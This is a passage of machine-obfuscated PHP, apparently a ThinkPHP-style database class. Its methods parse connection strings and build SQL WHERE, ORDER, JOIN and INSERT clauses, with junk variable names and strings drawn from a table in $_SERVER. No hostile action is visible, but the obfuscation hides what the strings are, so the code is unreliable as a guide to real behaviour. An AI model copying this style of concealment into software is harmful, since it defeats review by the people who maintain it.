$cÑÜ‰™Ş§¶[$E¹‘ší†Óì[648]], $E¹‘ší†Óì[567] => $cÑÜ‰™Ş§¶[$E¹‘ší†Óì[649]], $E¹‘ší†Óì[564] => $cÑÜ‰™Ş§¶[$E¹‘ší†Óì[650]], $E¹‘ší†Óì[565] => $cÑÜ‰™Ş§¶[$E¹‘ší†Óì[651]], $E¹‘ší†Óì[17] => $cÑÜ‰™Ş§¶[$E¹‘ší†Óì[652]], $E¹‘ší†Óì[594] => $cÑÜ‰™Ş§¶[$E¹‘ší†Óì[653]], $E¹‘ší†Óì[13] => $cÑÜ‰™Ş§¶[$E¹‘ší†Óì[654]]); } elseif (empty($cÑÜ‰™Ş§¶)) { if (think_config($E¹‘ší†Óì[493]) && $E¹‘ší†Óì[491] != strtolower(think_config($E¹‘ší†Óì[490]))) { $cÑÜ‰™Ş§¶ = $this->parseDSN(think_config($E¹‘ší†Óì[493])); } else { $cÑÜ‰™Ş§¶ = array($E¹‘ší†Óì[642] => think_config($E¹‘ší†Óì[490]), $E¹‘ší†Óì[566] => think_config($E¹‘ší†Óì[655]), $E¹‘ší†Óì[567] => think_config($E¹‘ší†Óì[656]), $E¹‘ší†Óì[564] => think_config($E¹‘ší†Óì[657]), $E¹‘ší†Óì[565] => think_config($E¹‘ší†Óì[658]), $E¹‘ší†Óì[17] => think_config($E¹‘ší†Óì[237]), $E¹‘ší†Óì[594] => think_config($E¹‘ší†Óì[493]), $E¹‘ší†Óì[13] => think_config($E¹‘ší†Óì[659])); } } return $cÑÜ‰™Ş§¶; } protected function initConnect($e±Ùô‡Ì±ç = true) { if (1 == think_config($_SERVER[İåâé¾][18])) { $this->_linkID = $this->multiConnect($e±Ùô‡Ì±ç); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($EåÓ÷Ãƒ = false) { $EàÌ´Ê§µ =& $_SERVER[İåâé¾]; static $fâ×Ô¼‘Ò = array(); if (empty($fâ×Ô¼‘Ò)) { foreach ($this->config as $D„öÇŒ¯² => $añí²¼©Ô‹) { $fâ×Ô¼‘Ò[$D„öÇŒ¯²] = explode($EàÌ´Ê§µ[47], $añí²¼©Ô‹); } } if (think_config($EàÌ´Ê§µ[660])) { if ($EåÓ÷Ãƒ) { $fŒÍ‚±–” = floor(mt_rand(0, think_config($EàÌ´Ê§µ[661]) - 1)); } else { if (is_numeric(think_config($EàÌ´Ê§µ[662]))) { $fŒÍ‚±–” = think_config($EàÌ´Ê§µ[662]); } else { $fŒÍ‚±–” = floor(mt_rand(think_config($EàÌ´Ê§µ[661]), count($fâ×Ô¼‘Ò[$EàÌ´Ê§µ[564]]) - 1)); } } } else { $fŒÍ‚±–” = floor(mt_rand(0, count($fâ×Ô¼‘Ò[$EàÌ´Ê§µ[564]]) - 1)); } $c¸ôÑ„¡Ë“ = array($EàÌ´Ê§µ[566] => isset($fâ×Ô¼‘Ò[$EàÌ´Ê§µ[566]][$fŒÍ‚±–”]) ? $fâ×Ô¼‘Ò[$EàÌ´Ê§µ[566]][$fŒÍ‚±–”] : $fâ×Ô¼‘Ò[$EàÌ´Ê§µ[566]][0], $EàÌ´Ê§µ[567] => isset($fâ×Ô¼‘Ò[$EàÌ´Ê§µ[567]][$fŒÍ‚±–”]) ? $fâ×Ô¼‘Ò[$EàÌ´Ê§µ[567]][$fŒÍ‚±–”] : $fâ×Ô¼‘Ò[$EàÌ´Ê§µ[567]][0], $EàÌ´Ê§µ[564] => isset($fâ×Ô¼‘Ò[$EàÌ´Ê§µ[564]][$fŒÍ‚±–”]) ? $fâ×Ô¼‘Ò[$EàÌ´Ê§µ[564]][$fŒÍ‚±–”] : $fâ×Ô¼‘Ò[$EàÌ´Ê§µ[564]][0], $EàÌ´Ê§µ[565] => isset($fâ×Ô¼‘Ò[$EàÌ´Ê§µ[565]][$fŒÍ‚±–”]) ? $fâ×Ô¼‘Ò[$EàÌ´Ê§µ[565]][$fŒÍ‚±–”] : $fâ×Ô¼‘Ò[$EàÌ´Ê§µ[565]][0], $EàÌ´Ê§µ[17] => isset($fâ×Ô¼‘Ò[$EàÌ´Ê§µ[17]][$fŒÍ‚±–”]) ? $fâ×Ô¼‘Ò[$EàÌ´Ê§µ[17]][$fŒÍ‚±–”] : $fâ×Ô¼‘Ò[$EàÌ´Ê§µ[17]][0], $EàÌ´Ê§µ[594] => isset($fâ×Ô¼‘Ò[$EàÌ´Ê§µ[594]][$fŒÍ‚±–”]) ? $fâ×Ô¼‘Ò[$EàÌ´Ê§µ[594]][$fŒÍ‚±–”] : $fâ×Ô¼‘Ò[$EàÌ´Ê§µ[594]][0], $EàÌ´Ê§µ[13] => isset($fâ×Ô¼‘Ò[$EàÌ´Ê§µ[13]][$fŒÍ‚±–”]) ? $fâ×Ô¼‘Ò[$EàÌ´Ê§µ[13]][$fŒÍ‚±–”] : $fâ×Ô¼‘Ò[$EàÌ´Ê§µ[13]][0]); return $this->connect($c¸ôÑ„¡Ë“, $fŒÍ‚±–”); } public function parseDSN($bÚ°†Ï™¶š) { $F…¦·Ê£ÔÂ =& $_SERVER[İåâé¾]; if (empty($bÚ°†Ï™¶š)) { return !1; } $aåßƒ•²¦• = parse_url($bÚ°†Ï™¶š); if ($aåßƒ•²¦•[$F…¦·Ê£ÔÂ[164]]) { $fÇ¢ç’×ƒ = array($F…¦·Ê£ÔÂ[642] => $aåßƒ•²¦•[$F…¦·Ê£ÔÂ[164]], $F…¦·Ê£ÔÂ[566] => isset($aåßƒ•²¦•[$F…¦·Ê£ÔÂ[416]]) ? $aåßƒ•²¦•[$F…¦·Ê£ÔÂ[416]] : $F…¦·Ê£ÔÂ[33], $F…¦·Ê£ÔÂ[567] => isset($aåßƒ•²¦•[$F…¦·Ê£ÔÂ[663]]) ? $aåßƒ•²¦•[$F…¦·Ê£ÔÂ[663]] : $F…¦·Ê£ÔÂ[33], $F…¦·Ê£ÔÂ[564] => isset($aåßƒ•²¦•[$F…¦·Ê£ÔÂ[165]]) ? $aåßƒ•²¦•[$F…¦·Ê£ÔÂ[165]] : $F…¦·Ê£ÔÂ[33], $F…¦·Ê£ÔÂ[565] => isset($aåßƒ•²¦•[$F…¦·Ê£ÔÂ[166]]) ? $aåßƒ•²¦•[$F…¦·Ê£ÔÂ[166]] : $F…¦·Ê£ÔÂ[33], $F…¦·Ê£ÔÂ[17] => isset($aåßƒ•²¦•[$F…¦·Ê£ÔÂ[76]]) ? substr($aåßƒ•²¦•[$F…¦·Ê£ÔÂ[76]], 1) : $F…¦·Ê£ÔÂ[33]); } else { preg_match($F…¦·Ê£ÔÂ[664], trim($bÚ°†Ï™¶š), $B¹¡Ş‰‚ù); $fÇ¢ç’×ƒ = array($F…¦·Ê£ÔÂ[642] => $B¹¡Ş‰‚ù[1], $F…¦·Ê£ÔÂ[566] => $B¹¡Ş‰‚ù[2], $F…¦·Ê£ÔÂ[567] => $B¹¡Ş‰‚ù[3], $F…¦·Ê£ÔÂ[564] => $B¹¡Ş‰‚ù[4], $F…¦·Ê£ÔÂ[565] => $B¹¡Ş‰‚ù[5], $F…¦·Ê£ÔÂ[17] => $B¹¡Ş‰‚ù[6]); } $fÇ¢ç’×ƒ[$F…¦·Ê£ÔÂ[594]] = $F…¦·Ê£ÔÂ[33]; return $fÇ¢ç’×ƒ; } protected function debug() { $D‰õÔ•¨Ñ× =& $_SERVER[İåâé¾]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $D‰õÔ•¨Ñ×[665]; if (think_config($D‰õÔ•¨Ñ×[666])) { think_status($D‰õÔ•¨Ñ×[667]); think_trace($this->queryStr . $D‰õÔ•¨Ñ×[668] . think_status($D‰õÔ•¨Ñ×[20], $D‰õÔ•¨Ñ×[667], 6) . $D‰õÔ•¨Ñ×[669], $D‰õÔ•¨Ñ×[33], $D‰õÔ•¨Ñ×[670]); } } protected function parseLock($cù¨¢Šğ¿è = false) { $dŒ²ğáø©à =& $_SERVER[İåâé¾]; if (!$cù¨¢Šğ¿è) { return $dŒ²ğáø©à[33]; } if ($dŒ²ğáø©à[596] == $this->dbType) { return $dŒ²ğáø©à[671]; } return $dŒ²ğáø©à[672]; } protected function parseSet($DÑ…ÏËÈí‹) { $AÂçŠÔ«® =& $_SERVER[İåâé¾]; foreach ($DÑ…ÏËÈí‹ as $eÃ…¢‘š† => $fõÙÙ´Ü) { if (is_array($fõÙÙ´Ü) && $AÂçŠÔ«®[288] == $fõÙÙ´Ü[0]) { $cœ“´‰‹[] = $this->parseKey($eÃ…¢‘š†) . $AÂçŠÔ«®[673] . $fõÙÙ´Ü[1]; } elseif (is_scalar($fõÙÙ´Ü) || is_null($fõÙÙ´Ü)) { $cœ“´‰‹[] = $this->parseKey($eÃ…¢‘š†) . $AÂçŠÔ«®[673] . $this->parseValue($fõÙÙ´Ü); } } return $AÂçŠÔ«®[674] . implode($AÂçŠÔ«®[47], $cœ“´‰‹); } protected function bindParam($CÜ£ßâƒĞ, $F¨ÚÙ…ŸéŠ) { $this->bind[$_SERVER[İåâé¾][4] . $CÜ£ßâƒĞ] = $F¨ÚÙ…ŸéŠ; } protected function parseBind($FÔàºÅ) { $FÔàºÅ = array_merge($this->bind, $FÔàºÅ); $this->bind = array(); return $FÔàºÅ; } function parseKey(&$D±—½ë¤»‚, $A¶®¹×’øÌ = true) { if ($A¶®¹×’øÌ) { $D±—½ë¤»‚ = $this->parseKeyCheck($D±—½ë¤»‚); } return $D±—½ë¤»‚; } function parseKeyCheck($d“ÊŒÇ¥¢â) { $CŞ×åêÜ½Ó =& $_SERVER[İåâé¾]; $d“ÊŒÇ¥¢â = trim($d“ÊŒÇ¥¢â); if (!preg_match($CŞ×åêÜ½Ó[675], $d“ÊŒÇ¥¢â)) { think_exception($CŞ×åêÜ½Ó[676] . $d“ÊŒÇ¥¢â); } return $d“ÊŒÇ¥¢â; } protected function parseValue($A¿Íâìö‰) { $b²˜…¨—² =& $_SERVER[İåâé¾]; if (is_string($A¿Íâìö‰)) { $A¿Íâìö‰ = $b²˜…¨—²[635] . $this->escapeString($A¿Íâìö‰) . $b²˜…¨—²[635]; } elseif (isset($A¿Íâìö‰[0]) && is_string($A¿Íâìö‰[0]) && strtolower($A¿Íâìö‰[0]) == $b²˜…¨—²[288]) { $A¿Íâìö‰ = $this->escapeString($A¿Íâìö‰[1]); } elseif (is_array($A¿Íâìö‰)) { $A¿Íâìö‰ = array_map(array($this, $b²˜…¨—²[636]), $A¿Íâìö‰); } elseif (is_bool($A¿Íâìö‰)) { $A¿Íâìö‰ = $A¿Íâìö‰ ? $b²˜…¨—²[376] : $b²˜…¨—²[402]; } elseif (is_null($A¿Íâìö‰)) { $A¿Íâìö‰ = $b²˜…¨—²[98]; } return $A¿Íâìö‰; } protected function parseField($BĞ–õ´»¹œ) { $D„ªŞ©ïòì =& $_SERVER[İåâé¾]; if (is_string($BĞ–õ´»¹œ) && strpos($BĞ–õ´»¹œ, $D„ªŞ©ïòì[47])) { $BĞ–õ´»¹œ = explode($D„ªŞ©ïòì[47], $BĞ–õ´»¹œ); } if (is_array($BĞ–õ´»¹œ)) { $d´Æë»ÄŠ = array(); foreach ($BĞ–õ´»¹œ as $E¯áÆİÉŒ => $EéĞñÓç±À) { if (!is_numeric($E¯áÆİÉŒ)) { $d´Æë»ÄŠ[] = $this->parseKey($E¯áÆİÉŒ) . $D„ªŞ©ïòì[677] . $this->parseKey($EéĞñÓç±À); } else { $d´Æë»ÄŠ[] = $this->parseKey($EéĞñÓç±À); } } $bàÀê…£Ş• = implode($D„ªŞ©ïòì[47], $d´Æë»ÄŠ); } elseif (is_string($BĞ–õ´»¹œ) && !empty($BĞ–õ´»¹œ)) { $bàÀê…£Ş• = $BĞ–õ´»¹œ; } else { $bàÀê…£Ş• = $D„ªŞ©ïòì[172]; } return $bàÀê…£Ş•; } protected function parseTable($A«ç´À¾Èù) { $dáÆô‰´  =& $_SERVER[İåâé¾]; if (is_array($A«ç´À¾Èù)) { $BŞ¾ó…Ğæ = array(); foreach ($A«ç´À¾Èù as $eĞøñíï¶ => $f®×“ÎÌô¥) { if (!is_numeric($eĞøñíï¶)) { $BŞ¾ó…Ğæ[] = $this->parseKey($eĞøñíï¶) . $dáÆô‰´ [50] . $this->parseKey($f®×“ÎÌô¥); } else { $BŞ¾ó…Ğæ[] = $this->parseKey($eĞøñíï¶); } } $A«ç´À¾Èù = $BŞ¾ó…Ğæ; } elseif (is_string($A«ç´À¾Èù)) { if (strstr($A«ç´À¾Èù, $dáÆô‰´ [50])) { return $A«ç´À¾Èù; } $A«ç´À¾Èù = explode($dáÆô‰´ [47], $A«ç´À¾Èù); array_walk($A«ç´À¾Èù, array($this, $dáÆô‰´ [583])); } return $dáÆô‰´ [678] . trim(implode($dáÆô‰´ [679], $A«ç´À¾Èù), $dáÆô‰´ [589]) . $dáÆô‰´ [678]; } protected function parseWhere($dëÇ°åÚ¸±) { $còÛÑÈº²· =& $_SERVER[İåâé¾]; $BæŸ™Ê†×Ä = $còÛÑÈº²·[33]; if (is_string($dëÇ°åÚ¸±)) { $BæŸ™Ê†×Ä = $dëÇ°åÚ¸±; } else { $c…ÖŒø‹®Á = isset($dëÇ°åÚ¸±[$còÛÑÈº²·[680]]) ? strtoupper($dëÇ°åÚ¸±[$còÛÑÈº²·[680]]) : $còÛÑÈº²·[33]; if (in_array($c…ÖŒø‹®Á, array($còÛÑÈº²·[681], $còÛÑÈº²·[682], $còÛÑÈº²·[683]))) { $c…ÖŒø‹®Á = $còÛÑÈº²·[50] . $c…ÖŒø‹®Á . $còÛÑÈº²·[50]; unset($dëÇ°åÚ¸±[$còÛÑÈº²·[680]]); } else { $c…ÖŒø‹®Á = $còÛÑÈº²·[684]; } foreach ($dëÇ°åÚ¸± as $b·µ–Ãß·² => $c‡ˆ‹ï‰ì„) { $BæŸ™Ê†×Ä .= $còÛÑÈº²·[268]; if (is_numeric($b·µ–Ãß·²)) { $b·µ–Ãß·² = $còÛÑÈº²·[685]; } if (0 === strpos($b·µ–Ãß·², $còÛÑÈº²·[71])) { $BæŸ™Ê†×Ä .= $this->parseThinkWhere($b·µ–Ãß·², $c‡ˆ‹ï‰ì„); } else { if (!preg_match($còÛÑÈº²·[686], trim($b·µ–Ãß·²))) { think_exception(think_lang($còÛÑÈº²·[687]) . $còÛÑÈº²·[4] . $b·µ–Ãß·²); } $FË¶­——í› = is_array($c‡ˆ‹ï‰ì„) && isset($c‡ˆ‹ï‰ì„[$còÛÑÈº²·[688]]); $b·µ–Ãß·² = trim($b·µ–Ãß·²); if (strpos($b·µ–Ãß·², $còÛÑÈº²·[274])) { $eÙ‘»’°çé = explode($còÛÑÈº²·[274], $b·µ–Ãß·²); $aÃíˆâÒ¥ï = array(); foreach ($eÙ‘»’°çé as $dì„‚ÒÌÎÛ => $b£…İØÂó¢) { $BÕÊíáÈ–„ = $FË¶­——í› ? $c‡ˆ‹ï‰ì„[$dì„‚ÒÌÎÛ] : $c‡ˆ‹ï‰ì„; $aÃíˆâÒ¥ï[] = $còÛÑÈº²·[251] . $this->parseWhereItem($this->parseKey($b£…İØÂó¢), $BÕÊíáÈ–„) . $còÛÑÈº²·[582]; } $BæŸ™Ê†×Ä .= implode($còÛÑÈº²·[689], $aÃíˆâÒ¥ï); } elseif (strpos($b·µ–Ãß·², $còÛÑÈº²·[275])) { $eÙ‘»’°çé = explode($còÛÑÈº²·[275], $b·µ–Ãß·²); $aÃíˆâÒ¥ï = array(); foreach ($eÙ‘»’°çé as $dì„‚ÒÌÎÛ => $b£…İØÂó¢) { $BÕÊíáÈ–„ = $FË¶­——í› ? $c‡ˆ‹ï‰ì„[$dì„‚ÒÌÎÛ] : $c‡ˆ‹ï‰ì„; $aÃíˆâÒ¥ï[] = $còÛÑÈº²·[251] . $this->parseWhereItem($this->parseKey($b£…İØÂó¢), $BÕÊíáÈ–„) . $còÛÑÈº²·[582]; } $BæŸ™Ê†×Ä .= implode($còÛÑÈº²·[684], $aÃíˆâÒ¥ï); } else { $BæŸ™Ê†×Ä .= $this->parseWhereItem($this->parseKey($b·µ–Ãß·²), $c‡ˆ‹ï‰ì„); } } $BæŸ™Ê†×Ä .= $còÛÑÈº²·[269] . $c…ÖŒø‹®Á; } $BæŸ™Ê†×Ä = substr($BæŸ™Ê†×Ä, 0, -strlen($c…ÖŒø‹®Á)); } return empty($BæŸ™Ê†×Ä) ? $còÛÑÈº²·[33] : $còÛÑÈº²·[690] . $BæŸ™Ê†×Ä; } protected function parseWhereItem($A‡æğÜ‚¦«, $BŸøÔ¡¸œˆ) { $Cºø‚Î =& $_SERVER[İåâé¾]; $cŒÛ©¨ÛÒ° = $Cºø‚Î[33]; if (is_array($BŸøÔ¡¸œˆ)) { if (is_string($BŸøÔ¡¸œˆ[0])) { $CîâÇ¥İÈç = strtolower($BŸøÔ¡¸œˆ[0]); if (in_array($BŸøÔ¡¸œˆ[0], array($Cºø‚Î[673], $Cºø‚Î[691], $Cºø‚Î[692], $Cºø‚Î[693], $Cºø‚Î[694], $Cºø‚Î[695]))) { $cŒÛ©¨ÛÒ° .= $A‡æğÜ‚¦« . $Cºø‚Î[50] . $BŸøÔ¡¸œˆ[0] . $Cºø‚Î[50] . $this->parseValue($BŸøÔ¡¸œˆ[1]); } elseif (preg_match($Cºø‚Î[696], $BŸøÔ¡¸œˆ[0])) { $cŒÛ©¨ÛÒ° .= $A‡æğÜ‚¦« . $Cºø‚Î[50] . $this->exp[$CîâÇ¥İÈç] . $Cºø‚Î[50] . $this->parseValue($BŸøÔ¡¸œˆ[1]); } elseif (preg_match($Cºø‚Î[697], $BŸøÔ¡¸œˆ[0])) { if (is_array($BŸøÔ¡¸œˆ[1])) { $C£èèÎ…­‹ = isset($BŸøÔ¡¸œˆ[2]) ? strtoupper($BŸøÔ¡¸œˆ[2]) : $Cºø‚Î[682]; if (in_array($C£èèÎ…­‹, array($Cºø‚Î[681], $Cºø‚Î[682], $Cºø‚Î[683]))) { $EæÜŠù¡¥ = array(); foreach ($BŸøÔ¡¸œˆ[1] as $BÓîáê¤¡£) { $EæÜŠù¡¥[] = $A‡æğÜ‚¦« . $Cºø‚Î[50] . $this->exp[$CîâÇ¥İÈç] . $Cºø‚Î[50] . $this->parseValue($BÓîáê¤¡£); } $cŒÛ©¨ÛÒ° .= $Cºø‚Î[251] . implode($Cºø‚Î[50] . $C£èèÎ…­‹ . $Cºø‚Î[50], $EæÜŠù¡¥) . $Cºø‚Î[582]; } } else { $cŒÛ©¨ÛÒ° .= $A‡æğÜ‚¦« . $Cºø‚Î[50] . $this->exp[$CîâÇ¥İÈç] . $Cºø‚Î[50] . $this->parseValue($BŸøÔ¡¸œˆ[1]); } } elseif ($Cºø‚Î[288] == $CîâÇ¥İÈç) { $cŒÛ©¨ÛÒ° .= $Cºø‚Î[580] . $A‡æğÜ‚¦« . $Cºø‚Î[50] . $BŸøÔ¡¸œˆ[1] . $Cºø‚Î[698]; } elseif (preg_match($Cºø‚Î[699], $BŸøÔ¡¸œˆ[0])) { if (isset($BŸøÔ¡¸œˆ[2]) && $Cºø‚Î[288] == $BŸøÔ¡¸œˆ[2]) { $cŒÛ©¨ÛÒ° .= $A‡æğÜ‚¦« . $Cºø‚Î[50] . $this->exp[$CîâÇ¥İÈç] . $Cºø‚Î[50] . $BŸøÔ¡¸œˆ[1]; } else { if (is_string($BŸøÔ¡¸œˆ[1])) { $BŸøÔ¡¸œˆ[1] = explode($Cºø‚Î[47], $BŸøÔ¡¸œˆ[1]); } $fŠÆ¯½„Îø = implode($Cºø‚Î[47], $this->parseValue($BŸøÔ¡¸œˆ[1])); $cŒÛ©¨ÛÒ° .= $A‡æğÜ‚¦« . $Cºø‚Î[50] . $this->exp[$CîâÇ¥İÈç] . $Cºø‚Î[580] . $fŠÆ¯½„Îø . $Cºø‚Î[582]; } } elseif (preg_match($Cºø‚Î[700], $BŸøÔ¡¸œˆ[0])) { $dÎ£º÷Û = is_string($BŸøÔ¡¸œˆ[1]) ? explode($Cºø‚Î[47], $BŸøÔ¡¸œˆ[1]) : $BŸøÔ¡¸œˆ[1]; $cŒÛ©¨ÛÒ° .= $Cºø‚Î[580] . $A‡æğÜ‚¦« . $Cºø‚Î[50] . $this->exp[$CîâÇ¥İÈç] . $Cºø‚Î[50] . $this->parseValue($dÎ£º÷Û[0]) . $Cºø‚Î[684] . $this->parseValue($dÎ£º÷Û[1]) . $Cºø‚Î[269]; } else { think_exception(think_lang($Cºø‚Î[687]) . $Cºø‚Î[4] . $BŸøÔ¡¸œˆ[0]); } } else { $c†²öé„‚  = count($BŸøÔ¡¸œˆ); $FÄ«¥‰ôĞ = isset($BŸøÔ¡¸œˆ[$c†²öé„‚  - 1]) ? strtoupper($BŸøÔ¡¸œˆ[$c†²öé„‚  - 1]) : $Cºø‚Î[33]; if (in_array($FÄ«¥‰ôĞ, array($Cºø‚Î[681], $Cºø‚Î[682], $Cºø‚Î[683]))) { $c†²öé„‚  = $c†²öé„‚  - 1; } else { $FÄ«¥‰ôĞ = $Cºø‚Î[681]; } for ($aÎ¹’·À§± = 0; $aÎ¹’·À§± < $c†²öé„‚ ; $aÎ¹’·À§±++) { $dÎ£º÷Û = is_array($BŸøÔ¡¸œˆ[$aÎ¹’·À§±]) ? $BŸøÔ¡¸œˆ[$aÎ¹’·À§±][1] : $BŸøÔ¡¸œˆ[$aÎ¹’·À§±]; if ($Cºø‚Î[288] == strtolower($BŸøÔ¡¸œˆ[$aÎ¹’·À§±][0])) { $cŒÛ©¨ÛÒ° .= $Cºø‚Î[251] . $A‡æğÜ‚¦« . $Cºø‚Î[50] . $dÎ£º÷Û . $Cºø‚Î[698] . $FÄ«¥‰ôĞ . $Cºø‚Î[50]; } else { $BµšÉŸ½·ø = is_array($BŸøÔ¡¸œˆ[$aÎ¹’·À§±]) ? $this->exp[strtolower($BŸøÔ¡¸œˆ[$aÎ¹’·À§±][0])] : $Cºø‚Î[673]; if (!$BµšÉŸ½·ø && is_array($BŸøÔ¡¸œˆ[$aÎ¹’·À§±]) && in_array($BŸøÔ¡¸œˆ[$aÎ¹’·À§±][0], array($Cºø‚Î[673], $Cºø‚Î[691], $Cºø‚Î[692], $Cºø‚Î[693], $Cºø‚Î[694], $Cºø‚Î[695]))) { $BµšÉŸ½·ø = $BŸøÔ¡¸œˆ[$aÎ¹’·À§±][0]; } $cŒÛ©¨ÛÒ° .= $Cºø‚Î[251] . $A‡æğÜ‚¦« . $Cºø‚Î[50] . $BµšÉŸ½·ø . $Cºø‚Î[50] . $this->parseValue($dÎ£º÷Û) . $Cºø‚Î[698] . $FÄ«¥‰ôĞ . $Cºø‚Î[50]; } } $cŒÛ©¨ÛÒ° = substr($cŒÛ©¨ÛÒ°, 0, -4); } } else { $cŒÛ©¨ÛÒ° .= $A‡æğÜ‚¦« . $Cºø‚Î[701] . $this->parseValue($BŸøÔ¡¸œˆ); } return $cŒÛ©¨ÛÒ°; } protected function parseThinkWhere($eÄ×éàò‚Ô, $cÎ÷‘ëª‰Ù) { $BÜé°Ñ§ê© =& $_SERVER[İåâé¾]; $f´Ê…ÚßÈ = $BÜé°Ñ§ê©[33]; switch ($eÄ×éàò‚Ô) { case $BÜé°Ñ§ê©[341]: $f´Ê…ÚßÈ = $cÎ÷‘ëª‰Ù; break; case $BÜé°Ñ§ê©[685]: $f´Ê…ÚßÈ = is_string($cÎ÷‘ëª‰Ù) ? $cÎ÷‘ëª‰Ù : substr($this->parseWhere($cÎ÷‘ëª‰Ù), 6); break; case $BÜé°Ñ§ê©[702]: parse_str($cÎ÷‘ëª‰Ù, $c™Éì¹·ˆ); if (isset($c™Éì¹·ˆ[$BÜé°Ñ§ê©[680]])) { $b Â¡Ë“Äå = $BÜé°Ñ§ê©[50] . strtoupper($c™Éì¹·ˆ[$BÜé°Ñ§ê©[680]]) . $BÜé°Ñ§ê©[50]; unset($c™Éì¹·ˆ[$BÜé°Ñ§ê©[680]]); } else { $b Â¡Ë“Äå = $BÜé°Ñ§ê©[684]; } $CÉ †È = array(); foreach ($c™Éì¹·ˆ as $c°ë‚ƒÖšâ => $FîÚ¾¦Êñô) { $CÉ †È[] = $this->parseKey($c°ë‚ƒÖšâ) . $BÜé°Ñ§ê©[701] . $this->parseValue($FîÚ¾¦Êñô); } $f´Ê…ÚßÈ = implode($b Â¡Ë“Äå, $CÉ †È); break; } return $f´Ê…ÚßÈ; } protected function parseLimit($Cˆ¼ƒ³) { $EŒõ ï¿Î =& $_SERVER[İåâé¾]; return !empty($Cˆ¼ƒ³) ? $EŒõ ï¿Î[48] . $Cˆ¼ƒ³ . $EŒõ ï¿Î[50] : $EŒõ ï¿Î[33]; } protected function parseJoin($Fê†”÷âŞ›) { $BÖ›ìà¡ =& $_SERVER[İåâé¾]; $bÌÆÆí°¹ = $BÖ›ìà¡[33]; if (!empty($Fê†”÷âŞ›)) { if (is_array($Fê†”÷âŞ›)) { foreach ($Fê†”÷âŞ› as $Eƒ¨®ÈìÆ¸ => $fçñ—¦æğ“) { if (!1 !== stripos($fçñ—¦æğ“, $BÖ›ìà¡[703])) { $bÌÆÆí°¹ .= $BÖ›ìà¡[50] . $fçñ—¦æğ“; } else { $bÌÆÆí°¹ .= $BÖ›ìà¡[704] . $fçñ—¦æğ“; } } } else { $bÌÆÆí°¹ .= $BÖ›ìà¡[704] . $Fê†”÷âŞ›; } } $bÌÆÆí°¹ = preg_replace($BÖ›ìà¡[705], think_config($BÖ›ìà¡[608]) . $BÖ›ìà¡[706], $bÌÆÆí°¹); return $bÌÆÆí°¹; } protected function parseOrder($Eî–Ü÷„¶) { $dˆË¢¦ÁÊ× =& $_SERVER[İåâé¾]; if (is_array($Eî–Ü÷„¶)) { $B§ÎøÉîÒÔ = array(); foreach ($Eî–Ü÷„¶ as $eà›ã„™ô => $Cáç¤Ã‡éÊ) { if (is_numeric($eà›ã„™ô)) { $B§ÎøÉîÒÔ[] = $this->parseKey($Cáç¤Ã‡éÊ); } else { $Cáç¤Ã‡éÊ = in_array(strtoupper(trim($Cáç¤Ã‡éÊ)), array($dˆË¢¦ÁÊ×[707], $dˆË¢¦ÁÊ×[708])) ? $dˆË¢¦ÁÊ×[50] . $Cáç¤Ã‡éÊ : $dˆË¢¦ÁÊ×[33]; if (preg_match($dˆË¢¦ÁÊ×[709], $eà›ã„™ô)) { $B§ÎøÉîÒÔ[] = $this->parseKey($eà›ã„™ô) . $Cáç¤Ã‡éÊ; } else { think_exception($dˆË¢¦ÁÊ×[710] . $eà›ã„™ô); } } } $Eî–Ü÷„¶ = implode($dˆË¢¦ÁÊ×[47], $B§ÎøÉîÒÔ); } return !empty($Eî–Ü÷„¶) ? $dˆË¢¦ÁÊ×[711] . $Eî–Ü÷„¶ : $dˆË¢¦ÁÊ×[33]; } protected function parseGroup($e½éƒªœƒ) { $fŒÉµëÖŒ =& $_SERVER[İåâé¾]; return !empty($e½éƒªœƒ) ? $fŒÉµëÖŒ[712] . $e½éƒªœƒ : $fŒÉµëÖŒ[33]; } protected function parseHaving($Döëùî‰ùì) { $AçíçµØ°é =& $_SERVER[İåâé¾]; return !empty($Döëùî‰ùì) ? $AçíçµØ°é[713] . $Döëùî‰ùì : $AçíçµØ°é[33]; } protected function parseComment($aÜÜ¢¬“õ) { $DĞâÍŠ²’¹ =& $_SERVER[İåâé¾]; return !empty($aÜÜ¢¬“õ) ? $DĞâÍŠ²’¹[714] . $aÜÜ¢¬“õ . $DĞâÍŠ²’¹[715] : $DĞâÍŠ²’¹[33]; } protected function parseDistinct($bñÉªÑ¬½¢) { $EÃØŒ®‰‡Š =& $_SERVER[İåâé¾]; return !empty($bñÉªÑ¬½¢) ? $EÃØŒ®‰‡Š[716] : $EÃØŒ®‰‡Š[33]; } protected function parseUnion($eø†š‰¥´) { $E™—’Ü“Ø =& $_SERVER[İåâé¾]; if (empty($eø†š‰¥´)) { return $E™—’Ü“Ø[33]; } if (isset($eø†š‰¥´[$E™—’Ü“Ø[339]])) { $B³õ‡Æ†¶â = $E™—’Ü“Ø[717]; unset($eø†š‰¥´[$E™—’Ü“Ø[339]]); } else { $B³õ‡Æ†¶â = $E™—’Ü“Ø[718]; } foreach ($eø†š‰¥´ as $Dä´–¥“Ì…) { $b¸Øˆ¿Æ‚Š[] = $B³õ‡Æ†¶â . (is_array($Dä´–¥“Ì…) ? $this->buildSelectSql($Dä´–¥“Ì…) : $Dä´–¥“Ì…); } return implode($E™—’Ü“Ø[50], $b¸Øˆ¿Æ‚Š); } public function insert($bä»¬Üñˆ, $aŸÕìã˜†† = array(), $aøƒ§Ëˆò = false) { goto e±‡äøÍ¤¬; e´²óš™á: foreach ($bä»¬Üñˆ as $B°Ë—„¬£ => $Aõå‡æïóõ) { if (is_array($Aõå‡æïóõ) && $fĞë»“Å…×[288] == $Aõå‡æïóõ[0]) { $fà‰”Ë‰Á¿[] = $this->parseKey($B°Ë—„¬£); $C×ŞğÀß´[] = $Aõå‡æïóõ[1]; } elseif (is_scalar($Aõå‡æïóõ) || is_null($Aõå‡æïóõ)) { $fà‰”Ë‰Á¿[] = $this->parseKey($B°Ë—„¬£); $C×ŞğÀß´[] = $this->parseValue($Aõå‡æïóõ); } } $Aš³»ÎÊ = ($aøƒ§Ëˆò ? $fĞë»“Å…×[584] : $fĞë»“Å…×[585]) . $fĞë»“Å…×[586] . $this->parseTable($aŸÕìã˜††[$fĞë»“Å…×[270]]) . $fĞë»“Å…×[580] . implode($fĞë»“Å…×[47], $fà‰”Ë‰Á¿) . $fĞë»“Å…×[581] . implode($fĞë»“Å…×[47], $C×ŞğÀß´) . $fĞë»“Å…×[582]; $Aš³»ÎÊ .= $this->parseLock(isset($aŸÕìã˜††[$fĞë»“Å…×[537]]) ? 